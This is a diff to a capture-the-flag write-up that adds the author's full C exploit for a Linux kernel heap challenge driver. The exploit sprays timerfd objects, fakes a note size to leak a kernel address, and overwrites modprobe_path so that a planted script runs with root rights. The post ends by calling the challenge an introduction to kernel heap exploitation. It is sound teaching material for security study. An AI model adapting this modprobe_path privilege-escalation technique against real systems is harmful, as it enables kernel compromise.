@@ -285,6 +285,144 @@ Running unknown file...
 Here is flag!
 AYCEP{m0Dp70B3_P47H_t0_R0P_LLC_53C73T_sT074g3}
 ```
+Final code:
+```c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/timerfd.h>
+#include <sys/msg.h>
+#include <sys/socket.h>
+
+#define DEVICE_PATH "/dev/secretstorage"
+#define CREATE  0xc020ca00
+#define READ    0xc020ca01
+#define WRITE   0xc020ca02
+#define RESIZE  0xc020ca03
+#define DELETE  0xc020ca04
+typedef struct req {
+    uint64_t idx;
+    uint64_t name_addr;
+    uint64_t note_size;
+    uint64_t note_addr;
+} REQ;
+#define MPPBASE 0x1b3f100
+typedef struct box {
+    char name[0x50];
+    uint64_t note_size; 
+    uint64_t note_addr;
+} BOX; // 0x60 - kmalloc-96
+#define ull unsigned long long
+void get_flag(){
+    puts("Setting up for fake modprobe...");
+    
+    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
+    system("chmod +x /tmp/x");
+
+    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
+    system("chmod +x /tmp/dummy");
+
+    puts("Running unknown file...");
+    system("/tmp/dummy 2>/dev/null");
+
+    puts("Here is flag!");
+    system("cat /tmp/flag");
+
+    exit(0);
+}
+
+int main() {
+    puts("Setting CPU affinity...");
+    cpu_set_t cpu;
+    CPU_ZERO(&cpu);
+    CPU_SET(0, &cpu);
+    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
+        perror("sched_setaffinity");
+        exit(-1);
+    }
+    
+    puts("Creating 2 boxes...");
+    int fd = open(DEVICE_PATH, O_WRONLY);
+    char name[0x1000] = {0};
+    ull leaks[0x600] = {0};
+    REQ req;
+    req.note_size = 0x100;
+    req.name_addr = name;
+    req.note_addr = leaks;
+    
+    ioctl(fd, CREATE, &req);
+    ioctl(fd, CREATE, &req);
+    
+    puts("Deleting box 1...");
+    req.idx = 1;
+    ioctl(fd, DELETE, &req);
+    
+    puts("Spraying timerfd_ctx objects in kmalloc-256...");
+    size_t timer_fds[500];
+    struct itimerspec its;
+    for(int i=0;i<500;i++){
+        if(i==250){
+            puts("Inserting new note in box 1, kmalloc-256...");
+            ioctl(fd, RESIZE, &req);
+        }
+        timer_fds[i] = timerfd_create(CLOCK_REALTIME, 0);
+        its.it_value.tv_sec = 1;
+        its.it_value.tv_nsec = 0;
+        its.it_interval.tv_sec = 1;
+        its.it_interval.tv_nsec = 0;
+        timerfd_settime(timer_fds[i], 0, &its, NULL);
+    }
+    puts("Sprayed objects! Waiting for objects to populate...");
+    sleep(1);
+    
+    puts("Allocating note of size 0x58 in box 0 to fit in kmalloc-96...");
+    req.idx = 0;
+    req.note_size = 0x58;
+    ull box[12] = {0};
+    box[10] = 0x200;
+    req.note_addr = box;
+    ioctl(fd, RESIZE, &req);
+    //item0's note now has item1
+    puts("Box 0's note now contains pointer to box 1! Box 1 note_size faked to 0x200, ready for OOB read");
+    
+    puts("Leaking modprobe_path address...");
+    req.idx = 1;
+    req.note_addr = leaks;
+    ioctl(fd, READ, &req);
+    ull mpp = leaks[37] + 0x1839180;
+    printf("Leaked modprobe_path address: %p\n", mpp);
+    
+    puts("Changing size of note in box 0 to include note_addr of box 1...");
+    puts("Overriding note_addr of box 1 to modprobe_path...");
+    req.idx = 0;
+    req.note_size = 0x60;
+    ull box2[12] = {0};
+    box2[10] = 0x100;
+    box2[11] = mpp;
+    req.note_addr = box2;
+    ioctl(fd, RESIZE, &req);
+    
+    puts("Overriding modprobe_path...");
+    char binsh[] = "/tmp/x";
+    req.idx = 1;
+    req.note_addr = binsh;
+    
+    ioctl(fd, WRITE, &req);
+    puts("modprobe_path overridden!");
+    get_flag();
+    close(fd);
+    return EXIT_SUCCESS;
+    return 0;
+}
+```
 
 ## Conclusion
 Overall, I really enjoyed this challenge, special thanks once again to Kaligula for writing this! Overall was a great introduction to the kernel heap and its various objects, while not being too difficult as to be unsolvable for a first-timer.
